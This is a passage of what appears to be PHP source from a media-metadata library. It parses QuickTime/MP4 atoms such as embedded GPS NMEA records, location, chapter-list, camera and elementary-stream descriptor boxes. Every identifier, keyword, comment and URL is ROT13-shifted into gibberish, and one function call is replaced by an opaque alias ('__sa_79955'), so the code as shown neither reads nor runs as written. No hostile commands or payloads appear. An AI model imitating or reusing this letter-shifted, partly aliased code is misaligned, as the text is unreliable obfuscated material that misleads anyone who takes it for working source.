										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['haxabja_pbhag']++;
										oernx;
								}
							}
							//vs (vffrg($qroht_fgehpgher['qroht_vgrzf']) && pbhag($qroht_fgehpgher['qroht_vgrzf']) > 0) {
							//	$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['qroht_yvfg'] = vzcybqr(',', $qroht_fgehpgher['qroht_vgrzf']);
							//} ryfr {
								$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['qroht_yvfg'] = 'Ab qroht vgrzf va yvfg!';
							//}
							oernx;

						qrsnhyg:
							$guvf->jneavat('Haunaqyrq \"hhvq\" ngbz vqragvsvrq ol \"'.$ngbz_fgehpgher['hhvq_svryq_vq'].'\" ng bssfrg '.$ngbz_fgehpgher['bssfrg'].' ('.fgeyra($ngbz_qngn).' olgrf)');
					}
					oernx;

				pnfr 'tcf ':
					// uggcf://qnfupnzgnyx.pbz/sbehz/guernqf/fpevcg-gb-rkgenpg-tcf-qngn-sebz-abingrx-zc4.20808/cntr-2#cbfg-291730
					// Gur 'tcf ' pbagnvaf fvzcyr ybbx hc gnoyr znqr hc bs 8olgr ebjf, gung cbvag gb gur 'serr' ngbzf gung pbagnvaf gur npghny TCF qngn.
					// Gur svefg ebj vf irefvba/zrgnqngn/abgfher, V fxvc gung.
					// Gur sbyybjvat ebjf pbafvfg bs 4olgr nqqerff (nofbyhgr) naq 4olgr fvmr (0k1000), gurfr cbvag gb gur TCF qngn va gur svyr.

					$TCF_ebjfvmr = 8; // 4 olgrf sbe bssfrg, 4 olgrf sbe fvmr
					vs (fgeyra($ngbz_qngn) > 0) {
						vs ((fgeyra($ngbz_qngn) % $TCF_ebjfvmr) == 0) {
							$ngbz_fgehpgher['tcf_gbp'] = neenl();
							sbernpu (fge_fcyvg($ngbz_qngn, $TCF_ebjfvmr) nf $pbhagre => $qngncnve) {
								$ngbz_fgehpgher['tcf_gbp'][] = hacnpx('Abssfrg/Afvmr', fhofge($ngbz_qngn, $pbhagre * $TCF_ebjfvmr, $TCF_ebjfvmr));
							}

							$ngbz_fgehpgher['tcf_ragevrf'] = neenl();
							$cerivbhf_bssfrg = $guvf->sgryy();
							sbernpu ($ngbz_fgehpgher['tcf_gbp'] nf $xrl => $tcf_cbvagre) {
								vs ($xrl == 0) {
									// \"Gur svefg ebj vf irefvba/zrgnqngn/abgfher, V fxvc gung.\"
									pbagvahr;
								}
								$guvf->sfrrx($tcf_cbvagre['bssfrg']);
								$TCF_serr_qngn = $guvf->sernq($tcf_cbvagre['fvmr']);

								/*
								// 2017-05-10: V frr fbzr bs gur qngn, abgnoyl gur Ubhe-Zvahgr-Frpbaq, ohg pnaabg erpbapvyr gur erfg bs gur qngn. Ubjrire, gur AZRN \"TCEZP\" yvar vf gurer naq eryngviryl rnfl gb cnefr, fb V'z hfvat gung vafgrnq

								// uggcf://qnfupnzgnyx.pbz/sbehz/guernqf/fpevcg-gb-rkgenpg-tcf-qngn-sebz-abingrx-zc4.20808/cntr-2#cbfg-291730
								// Gur fgehpgher bs gur TCF qngn ngbz (gur 'serr' ngbzf zragvbarq nobir) vf sbyybjvat:
								// ubhe,zvahgr,frpbaq,lrne,zbagu,qnl,npgvir,yngvghqr_o,ybatvghqr_o,haxabja2,yngvghqr,ybatvghqr,fcrrq = fgehpg.hacnpx_sebz('<VVVVVVffffsss',qngn, 48)
								// Sbe gubfr hasnzvyvne jvgu clguba fgehpg:
								// V = vag
								// f = vf fgevat (fvmr 1, va guvf pnfr)
								// s = sybng

								//$ngbz_fgehpgher['tcf_ragevrf'][$xrl] = hacnpx('Iubhe/Izvahgr/Ifrpbaq/Ilrne/Izbagu/Iqnl/Inpgvir/Iyngvghqr_o/Iybatvghqr_o/Ihaxabja2/syngvghqr/sybatvghqr/sfcrrq', fhofge($TCF_serr_qngn, 48));
								*/

								// $TCEZP,081836,N,3751.65,F,14507.36,R,000.0,360.0,130998,011.3,R*62
								// $TCEZP,183731,N,3907.482,A,12102.436,J,000.0,360.0,080301,015.5,R*67
								// $TCEZP,002454,N,3553.5295,A,13938.6570,R,0.0,43.1,180700,7.1,J,N*3S
								// $TCEZP,094347.000,N,5342.0061,A,00737.9908,J,0.01,156.75,140217,,,N*7Q
								vs (cert_zngpu('#\\$TCEZP,([0-9\\.]*),([NI]),([0-9\\.]*),([AF]),([0-9\\.]*),([RJ]),([0-9\\.]*),([0-9\\.]*),([0-9]*),([0-9\\.]*),([RJ]?)(,[N])?(\\*[0-9N-S]{2})#', $TCF_serr_qngn, $zngpurf)) {
									$TCF_guvf_TCEZP = neenl();
									$TCF_guvf_TCEZP_enj = neenl();
									yvfg(
										$TCF_guvf_TCEZP_enj['tcezp'],
										$TCF_guvf_TCEZP_enj['gvzrfgnzc'],
										$TCF_guvf_TCEZP_enj['fgnghf'],
										$TCF_guvf_TCEZP_enj['yngvghqr'],
										$TCF_guvf_TCEZP_enj['yngvghqr_qverpgvba'],
										$TCF_guvf_TCEZP_enj['ybatvghqr'],
										$TCF_guvf_TCEZP_enj['ybatvghqr_qverpgvba'],
										$TCF_guvf_TCEZP_enj['xabgf'],
										$TCF_guvf_TCEZP_enj['natyr'],
										$TCF_guvf_TCEZP_enj['qngrfgnzc'],
										$TCF_guvf_TCEZP_enj['inevngvba'],
										$TCF_guvf_TCEZP_enj['inevngvba_qverpgvba'],
										$qhzzl,
										$TCF_guvf_TCEZP_enj['purpxfhz'],
									) = $zngpurf;
									$TCF_guvf_TCEZP['enj'] = $TCF_guvf_TCEZP_enj;

									$ubhe   = fhofge($TCF_guvf_TCEZP['enj']['gvzrfgnzc'], 0, 2);
									$zvahgr = fhofge($TCF_guvf_TCEZP['enj']['gvzrfgnzc'], 2, 2);
									$frpbaq = fhofge($TCF_guvf_TCEZP['enj']['gvzrfgnzc'], 4, 2);
									$zf     = fhofge($TCF_guvf_TCEZP['enj']['gvzrfgnzc'], 6);    // znl pbagnva qrpvzny frpbaqf
									$qnl    = fhofge($TCF_guvf_TCEZP['enj']['qngrfgnzc'], 0, 2);
									$zbagu  = fhofge($TCF_guvf_TCEZP['enj']['qngrfgnzc'], 2, 2);
									$lrne   = (vag) fhofge($TCF_guvf_TCEZP['enj']['qngrfgnzc'], 4, 2);
									$lrne += (($lrne > 90) ? 1900 : 2000); // pbzcyrgr ynpx bs sberfvtug: qngrfgnzcf ner fgberq jvgu 2-qvtvg lrnef, gnxr orfg thrff
									$TCF_guvf_TCEZP['gvzrfgnzc'] = $lrne.'-'.$zbagu.'-'.$qnl.' '.$ubhe.':'.$zvahgr.':'.$frpbaq.$zf;

									$TCF_guvf_TCEZP['npgvir'] = ($TCF_guvf_TCEZP['enj']['fgnghf'] == 'N'); // N=Npgvir,I=Ibvq

									sbernpu (neenl('yngvghqr','ybatvghqr') nf $yngyba) {
										cert_zngpu('#^([0-9]{1,3})([0-9]{2}\\.[0-9]+)$#', $TCF_guvf_TCEZP['enj'][$yngyba], $zngpurf);
										yvfg($qhzzl, $qrt, $zva) = $zngpurf;
										$TCF_guvf_TCEZP[$yngyba] = $qrt + ($zva / 60);
									}
									$TCF_guvf_TCEZP['yngvghqr']  *= (($TCF_guvf_TCEZP['enj']['yngvghqr_qverpgvba']  == 'F') ? -1 : 1);
									$TCF_guvf_TCEZP['ybatvghqr'] *= (($TCF_guvf_TCEZP['enj']['ybatvghqr_qverpgvba'] == 'J') ? -1 : 1);

									$TCF_guvf_TCEZP['urnqvat']    = $TCF_guvf_TCEZP['enj']['natyr'];
									$TCF_guvf_TCEZP['fcrrq_xabg'] = $TCF_guvf_TCEZP['enj']['xabgf'];
									$TCF_guvf_TCEZP['fcrrq_xzu']  = $TCF_guvf_TCEZP['enj']['xabgf'] * 1.852;
									vs ($TCF_guvf_TCEZP['enj']['inevngvba']) {
										$TCF_guvf_TCEZP['inevngvba']  = $TCF_guvf_TCEZP['enj']['inevngvba'];
										$TCF_guvf_TCEZP['inevngvba'] *= (($TCF_guvf_TCEZP['enj']['inevngvba_qverpgvba'] == 'J') ? -1 : 1);
									}

									$ngbz_fgehpgher['tcf_ragevrf'][$xrl] = $TCF_guvf_TCEZP;

									@$vasb['dhvpxgvzr']['tcf_genpx'][$TCF_guvf_TCEZP['gvzrfgnzc']] = neenl(
										'yngvghqr'  => (sybng) $TCF_guvf_TCEZP['yngvghqr'],
										'ybatvghqr' => (sybng) $TCF_guvf_TCEZP['ybatvghqr'],
										'fcrrq_xzu' => (sybng) $TCF_guvf_TCEZP['fcrrq_xzu'],
										'urnqvat'   => (sybng) $TCF_guvf_TCEZP['urnqvat'],
									);

								} ryfr {
									$guvf->jneavat('Haunaqyrq TCF sbezng va \"serr\" ngbz ng bssfrg '.$tcf_cbvagre['bssfrg']);
								}
							}
							$guvf->sfrrx($cerivbhf_bssfrg);

						} ryfr {
							$guvf->jneavat('DhvpxGvzr ngbz \"'.$ngbzanzr.'\" vf abg zbq-8 olgrf ybat ('.$ngbzfvmr.' olgrf) ng bssfrg '.$onfrbssfrg);
						}
					} ryfr {
						$guvf->jneavat('DhvpxGvzr ngbz \"'.$ngbzanzr.'\" vf mreb olgrf ybat ng bssfrg '.$onfrbssfrg);
					}
					oernx;

				pnfr 'ybpv':// 3TC ybpngvba (Ry Ybpb)
					$ybssfrg = 0;
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_syntf']     = neenl(  trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 4)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_ynat']      = neenl(  trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 4, 2)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_ybpngvba']  = neenl(          $guvf->YbpvFgevat(fhofge($ngbz_qngn, 6), $ybssfrg));
					$ybpv_qngn = fhofge($ngbz_qngn, 6 + $ybssfrg);
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_ebyr']      = neenl(  trgvq3_yvo::OvtRaqvna2Vag(fhofge($ybpv_qngn, 0, 1)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_ybatvghqr'] = neenl(trgvq3_yvo::SvkrqCbvag16_16(fhofge($ybpv_qngn, 1, 4)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_yngvghqr']  = neenl(trgvq3_yvo::SvkrqCbvag16_16(fhofge($ybpv_qngn, 5, 4)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_nygvghqr']  = neenl(trgvq3_yvo::SvkrqCbvag16_16(fhofge($ybpv_qngn, 9, 4)));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_obql']      = neenl(          $guvf->YbpvFgevat(fhofge($ybpv_qngn, 13           ), $ybssfrg));
					$vasb['dhvpxgvzr']['pbzzragf']['tcf_abgrf']     = neenl(          $guvf->YbpvFgevat(fhofge($ybpv_qngn, 13 + $ybssfrg), $ybssfrg));
					oernx;

				pnfr 'pucy': // PUnCgre Yvfg
					// uggcf://jjj.nqbor.pbz/pbagrag/qnz/Nqbor/ra/qriarg/syi/cqsf/ivqrb_svyr_sbezng_fcrp_i10.cqs
					$pucy_irefvba = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 4, 1)); // Rkcrpgrq gb or 0
					$pucy_syntf   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 5, 3)); // Erfreirq, frg gb 0
					$pucy_pbhag   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 8, 1));
					$pucy_bssfrg = 9;
					sbe ($v = 0; $v < $pucy_pbhag; $v++) {
						vs (($pucy_bssfrg + 9) >= fgeyra($ngbz_qngn)) {
							$guvf->jneavat('DhvpxGvzr puncgre '.$v.' rkgraqf orlbaq raq bs \"pucy\" ngbz');
							oernx;
						}
						$vasb['dhvpxgvzr']['puncgref'][$v]['gvzrfgnzc'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $pucy_bssfrg, 8)) / 10000000; // gvzrfgnzcf ner fgberq nf 100-anabfrpbaq havgf
						$pucy_bssfrg += 8;
						$pucy_gvgyr_fvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $pucy_bssfrg, 1));
						$pucy_bssfrg += 1;
						$vasb['dhvpxgvzr']['puncgref'][$v]['gvgyr']     =                           fhofge($ngbz_qngn, $pucy_bssfrg, $pucy_gvgyr_fvmr);
						$pucy_bssfrg += $pucy_gvgyr_fvmr;
					}
					oernx;

				pnfr 'SVEZ': // SVEZjner irefvba(?), frra ba TbCeb Ureb4
					$vasb['dhvpxgvzr']['pnzren']['svezjner'] = $ngbz_qngn;
					oernx;

				pnfr 'PNZR': // SVEZjner irefvba(?), frra ba TbCeb Ureb4
					$vasb['dhvpxgvzr']['pnzren']['frevny_unfu'] = hacnpx('U*', $ngbz_qngn);
					oernx;

				pnfr 'qfpc':
				pnfr 'epvs':
					// uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1908
					vs (fhofge($ngbz_qngn, 0, 7) == \"\k00\k00\k00\k00\k55\kP4\".'{') {
						vs ($wfba_qrpbqrq = @wfba_qrpbqr(egevz(fhofge($ngbz_qngn, 6), \"\k00\"), gehr)) {
							$vasb['dhvpxgvzr']['pnzren'][$ngbzanzr] = $wfba_qrpbqrq;
							vs (($ngbzanzr == 'epvs') && vffrg($vasb['dhvpxgvzr']['pnzren']['epvs']['jkpnzren']['ebgngr'])) {
								$vasb['ivqrb']['ebgngr'] = $vasb['dhvpxgvzr']['ivqrb']['ebgngr'] = $vasb['dhvpxgvzr']['pnzren']['epvs']['jkpnzren']['ebgngr'];
							}
						} ryfr {
							$guvf->jneavat('Snvyrq gb WFBA qrpbqr ngbz \"'.$ngbzanzr.'\"');
							$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
						}
						hafrg($wfba_qrpbqrq);
					} ryfr {
						$guvf->jneavat('Rkcrpgvat 55 P4 7O ng fgneg bs ngbz \"'.$ngbzanzr.'\", sbhaq '.trgvq3_yvo::CevagUrkOlgrf(fhofge($ngbz_qngn, 4, 3)).' vafgrnq');
						$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					}
					oernx;

				pnfr 'sern':
					// uggcf://jjj.fab.cul.dhrrafh.pn/~cuvy/rkvsgbby/GntAnzrf/Xbqnx.ugzy#sern
					// znl pbagnva \"fpen\" (CerivrjVzntr) naq/be \"guzn\" (GuhzoanvyVzntr)
					$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 4, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					oernx;
				pnfr 'gvzn': // fhongbz gb \"sern\"
					// ab vqrn jung guvf qbrf, gur bar fnzcyr svyr V'ir frra unf n inyhr bs 0k00000027
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;
				pnfr 'ire ': // fhongbz gb \"sern\"
					// fbzr xvaq bs irefvba ahzore, gur bar fnzcyr svyr V'ir frra unf n inyhr bs \"3.00.073\"
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;
				pnfr 'guzn': // fhongbz gb \"sern\" -- \"GuhzoanvyVzntr\"
					// uggcf://jjj.fab.cul.dhrrafh.pn/~cuvy/rkvsgbby/GntAnzrf/Xbqnx.ugzy#sern
					vs (fgeyra($ngbz_qngn) > 0) {
						$vasb['dhvpxgvzr']['pbzzragf']['cvpgher'][] = neenl('qngn'=>$ngbz_qngn, 'vzntr_zvzr'=>'vzntr/wcrt', 'qrfpevcgvba'=>'GuhzoanvyVzntr');
					}
					oernx;
				pnfr 'fpen': // fhongbz gb \"sern\" -- \"CerivrjVzntr\"
					// uggcf://jjj.fab.cul.dhrrafh.pn/~cuvy/rkvsgbby/GntAnzrf/Xbqnx.ugzy#sern
					// ohg gur bayl fnzcyr svyr V'ir frra unf ab hfrshy qngn urer
					vs (fgeyra($ngbz_qngn) > 0) {
						$vasb['dhvpxgvzr']['pbzzragf']['cvpgher'][] = neenl('qngn'=>$ngbz_qngn, 'vzntr_zvzr'=>'vzntr/wcrt', 'qrfpevcgvba'=>'CerivrjVzntr');
					}
					oernx;

				pnfr 'pqfp': // gvzrq zrgnqngn ersrerapr
					// N DhvpxGvzr zbivr pna pbagnva abar, bar, be frireny gvzrq zrgnqngn genpxf. Gvzrq zrgnqngn genpxf pna ersre gb zhygvcyr genpxf.
					// Zrgnqngn genpxf ner yvaxrq gb gur genpxf gurl qrfpevor hfvat n genpx-ersrerapr bs glcr 'pqfp'. Gur zrgnqngn genpx ubyqf gur 'pqfp' genpx ersrerapr.
					$ngbz_fgehpgher['genpx_ahzore'] = trgvq3_yvo::OvtRaqvna2Vag($ngbz_qngn);
					oernx;


				pnfr 'rfqf': // Ryrzragnel Fgernz QrFpevcgbe
					// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/414
					// uggcf://puebzvhz.tbbtyrfbhepr.pbz/puebzvhz/fep/zrqvn/+/ersf/urnqf/znva/sbezngf/zc4/rf_qrfpevcgbe.pp
					// uggcf://puebzvhz.tbbtyrfbhepr.pbz/puebzvhz/fep/zrqvn/+/ersf/urnqf/znva/sbezngf/zc4/rf_qrfpevcgbe.u
					$ngbz_fgehpgher['irefvba']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1)); // uneqpbqrq: 0k00
					$ngbz_fgehpgher['syntf_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k000000
					$rfqf_bssfrg = 4;

					$ngbz_fgehpgher['RF_QrfpeGnt'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					vs ($ngbz_fgehpgher['RF_QrfpeGnt'] != 0k03) {
						$guvf->jneavat('rkcrpgvat rfqf.RF_QrfpeGnt = 0k03, sbhaq 0k'.trgvq3_yvo::CevagUrkOlgrf($ngbz_fgehpgher['RF_QrfpeGnt']).'), ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
						oernx;
					}
					$ngbz_fgehpgher['RF_QrfpeFvmr'] = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $rfqf_bssfrg);

					$ngbz_fgehpgher['RF_VQ'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 2));
					$rfqf_bssfrg += 2;
					$ngbz_fgehpgher['RF_syntfenj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					$ngbz_fgehpgher['RF_syntf']['fgernz_qrcraqrapl'] = (obby) ($ngbz_fgehpgher['RF_syntfenj'] & 0k80);
					$ngbz_fgehpgher['RF_syntf']['hey_synt']          = (obby) ($ngbz_fgehpgher['RF_syntfenj'] & 0k40);
					$ngbz_fgehpgher['RF_syntf']['bpe_fgernz']        = (obby) ($ngbz_fgehpgher['RF_syntfenj'] & 0k20);
					$ngbz_fgehpgher['RF_fgernz_cevbevgl']            =        ($ngbz_fgehpgher['RF_syntfenj'] & 0k1S);
					vs ($ngbz_fgehpgher['RF_syntf']['hey_synt']) {
						$guvf->jneavat('Hafhccbegrq rfqf.hey_synt ranoyrq ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
						oernx;
					}
					vs ($ngbz_fgehpgher['RF_syntf']['fgernz_qrcraqrapl']) {
						$ngbz_fgehpgher['RF_qrcraqfBa_RF_VQ'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 2));
						$rfqf_bssfrg += 2;
					}
					vs ($ngbz_fgehpgher['RF_syntf']['bpe_fgernz']) {
						$ngbz_fgehpgher['RF_BPE_RF_Vq'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 2));
						$rfqf_bssfrg += 2;
					}

					$ngbz_fgehpgher['RF_QrpbqrePbasvtQrfpeGnt'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					vs ($ngbz_fgehpgher['RF_QrpbqrePbasvtQrfpeGnt'] != 0k04) {
						$guvf->jneavat('rkcrpgvat rfqf.RF_QrpbqrePbasvtQrfpeGnt = 0k04, sbhaq 0k'.trgvq3_yvo::CevagUrkOlgrf($ngbz_fgehpgher['RF_QrpbqrePbasvtQrfpeGnt']).'), ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
						oernx;
					}
					$ngbz_fgehpgher['RF_QrpbqrePbasvtQrfpeGntFvmr'] = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $rfqf_bssfrg);

					$ngbz_fgehpgher['RF_bowrpgGlcrVaqvpngvba'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					// uggcf://fgnpxbiresybj.pbz/dhrfgvbaf/3987850
					// 0k40 = \"Nhqvb VFB/VRP 14496-3\"                       = ZCRT-4 Nhqvb
					// 0k67 = \"Nhqvb VFB/VRP 13818-7 YbjPbzcyrkvgl Cebsvyr\" = ZCRT-2 NNP YP
					// 0k69 = \"Nhqvb VFB/VRP 13818-3\"                       = ZCRT-2 Onpxjneq Pbzcngvoyr Nhqvb (ZCRT-2 Ynlref 1, 2, naq 3)
					// 0k6O = \"Nhqvb VFB/VRP 11172-3\"                       = ZCRT-1 Nhqvb (ZCRT-1 Ynlref 1, 2, naq 3)

					$fgernzGlcrCyhfSyntf = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					$ngbz_fgehpgher['RF_fgernzGlcr'] =        ($fgernzGlcrCyhfSyntf & 0kSP) >> 2;
					$ngbz_fgehpgher['RF_hcFgernz']   = (obby) ($fgernzGlcrCyhfSyntf & 0k02) >> 1;
					$ngbz_fgehpgher['RF_ohssreFvmrQO'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 3));
					$rfqf_bssfrg += 3;
					$ngbz_fgehpgher['RF_znkOvgengr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 4));
					$rfqf_bssfrg += 4;
					$ngbz_fgehpgher['RF_nitOvgengr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 4));
					$rfqf_bssfrg += 4;
					vs ($ngbz_fgehpgher['RF_nitOvgengr']) {
						$vasb['dhvpxgvzr']['nhqvb']['ovgengr'] = $ngbz_fgehpgher['RF_nitOvgengr'];
						$vasb['nhqvb']['ovgengr']              = $ngbz_fgehpgher['RF_nitOvgengr'];
					}

					$ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGnt'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					vs ($ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGnt'] != 0k05) {
						$guvf->jneavat('rkcrpgvat rfqf.RF_QrpFcrpvsvpVasbGnt = 0k05, sbhaq 0k'.trgvq3_yvo::CevagUrkOlgrf($ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGnt']).'), ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
						oernx;
					}
					$ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGntFvmr'] = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $rfqf_bssfrg);

					$ngbz_fgehpgher['RF_QrpFcrpvsvpVasb'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, $ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGntFvmr']));
					$rfqf_bssfrg += $ngbz_fgehpgher['RF_QrpFcrpvsvpVasbGntFvmr'];

					$ngbz_fgehpgher['RF_FYPbasvtQrfpeGnt'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, 1));
					$rfqf_bssfrg += 1;
					vs ($ngbz_fgehpgher['RF_FYPbasvtQrfpeGnt'] != 0k06) {
						$guvf->jneavat('rkcrpgvat rfqf.RF_FYPbasvtQrfpeGnt = 0k05, sbhaq 0k'.trgvq3_yvo::CevagUrkOlgrf($ngbz_fgehpgher['RF_FYPbasvtQrfpeGnt']).'), ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
						oernx;
					}
					$ngbz_fgehpgher['RF_FYPbasvtQrfpeGntFvmr'] = $guvf->dhvpxgvzr_ernq_zc4_qrfpe_yratgu($ngbz_qngn, $rfqf_bssfrg);

					$ngbz_fgehpgher['RF_FYPbasvtQrfpe'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $rfqf_bssfrg, $ngbz_fgehpgher['RF_FYPbasvtQrfpeGntFvmr']));
					$rfqf_bssfrg += $ngbz_fgehpgher['RF_FYPbasvtQrfpeGntFvmr'];
					oernx;

// NIVS-eryngrq - uggcf://qbpf.ef/nivs-cnefr/0.13.2/fep/nivs_cnefr/obkrf.ef.ugzy
				pnfr 'cvgz': // Cevznel VGrZ
				pnfr 'vybp': // Vgrz YBPngvba
				pnfr 'vvas': // Vgrz VASb
				pnfr 'vers': // Vzntr ERSrerapr
				pnfr 'vcec': // Vzntr CEbCregvrf
$guvf->reebe('NIVS svyrf abg pheeragyl fhccbegrq');
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;

				pnfr 'gsqg': // Genpx Sentzrag onfr zrqvn Qrpbqr Gvzr obk
				pnfr 'gsuq': // Genpx Sentzrag UrnQre obk
				pnfr 'zsuq': // Zbivr Sentzrag UrnQre obk
				pnfr 'geha': // Genpx sentzrag EHA obk
$guvf->reebe('sentzragrq zc4 svyrf abg pheeragyl fhccbegrq');
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;

				pnfr 'zirk': // ZbIvr RKgraqf obk
				pnfr 'cffu': // Cebgrpgvba Flfgrz Fcrpvsvp Urnqre obk
				pnfr 'fvqk': // Frtzrag VaQrK obk
				qrsnhyg:
					$guvf->jneavat('Haxabja DhvpxGvzr ngbz glcr: \"'.__sa_79955('#[^n-mN-M0-9 _\\-]#', '?', $ngbzanzr).'\" ('.gevz(trgvq3_yvo::CevagUrkOlgrf($ngbzanzr)).'), '.$ngbzfvmr.' olgrf ng bssfrg '.$onfrbssfrg);
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;
			}
		}
		neenl_cbc($ngbzUvrenepul);
		erghea $ngbz_fgehpgher;
	}

	/**
	 * @cnenz fgevat $ngbz_qngn
	 * @cnenz vag    $onfrbssfrg
	 * @cnenz neenl  $ngbzUvrenepul
	 * @cnenz obby   $CnefrNyyCbffvoyrNgbzf
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp shapgvba DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg, &$ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf) {
		$ngbz_fgehpgher = neenl();
		$fhongbzbssfrg  = 0;
		$fhongbzpbhagre = 0;
		vs ((fgeyra($ngbz_qngn) == 4) && (trgvq3_yvo::OvtRaqvna2Vag($ngbz_qngn) == 0k00000000)) {
			erghea snyfr;
		}
		juvyr ($fhongbzbssfrg < fgeyra($ngbz_qngn)) {
			$fhongbzfvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fhongbzbssfrg + 0, 4));
			$fhongbzanzr =                           fhofge($ngbz_qngn, $fhongbzbssfrg + 4, 4);
			$fhongbzqngn =                           fhofge($ngbz_qngn, $fhongbzbssfrg + 8, $fhongbzfvmr - 8);
			vs ($fhongbzfvmr == 0) {
				// Shegurezber, sbe uvfgbevpny ernfbaf gur yvfg bs ngbzf vf bcgvbanyyl
				// grezvangrq ol n 32-ovg vagrtre frg gb 0. Vs lbh ner jevgvat n cebtenz
				// gb ernq hfre qngn ngbzf, lbh fubhyq nyybj sbe gur grezvangvat 0.
				vs (fgeyra($ngbz_qngn) > 12) {
					$fhongbzbssfrg += 4;
					pbagvahr;
				}
				oernx;
			}
			vs (fgeyra($fhongbzqngn) < ($fhongbzfvmr - 8)) {
			    // jr qba'g unir rabhtu qngn gb qrpbqr gur fhongbz.
			    // guvf znl or orpnhfr jr ner ershfvat gb cnefr ynetr fhongbzf, be vg znl or orpnhfr guvf ngbz unq vgf fvmr frg gbb ynetr
			    // fb jr cnffrq va gur fgneg bs n sbyybjvat ngbz vapbeerpgyl?
			    oernx;
			}
			$ngbz_fgehpgher[$fhongbzpbhagre++] = $guvf->DhvpxgvzrCnefrNgbz($fhongbzanzr, $fhongbzfvmr, $fhongbzqngn, $onfrbssfrg + $fhongbzbssfrg, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
			$fhongbzbssfrg += $fhongbzfvmr;
		}

		vs (rzcgl($ngbz_fgehpgher)) {
			erghea snyfr;
		}

		erghea $ngbz_fgehpgher;
	}

	/**
	 * @cnenz fgevat $qngn
	 * @cnenz vag    $bssfrg
	 *
	 * @erghea vag
	 */
	choyvp shapgvba dhvpxgvzr_ernq_zc4_qrfpe_yratgu($qngn, &$bssfrg) {
		// uggc://yvodhvpxgvzr.fbheprnepuvir.pbz/qbphzragngvba/2:1.0.2cyhf-cqrovna-2ohvyq1/rfqf_8p-fbhepr.ugzy
		$ahz_olgrf = 0;
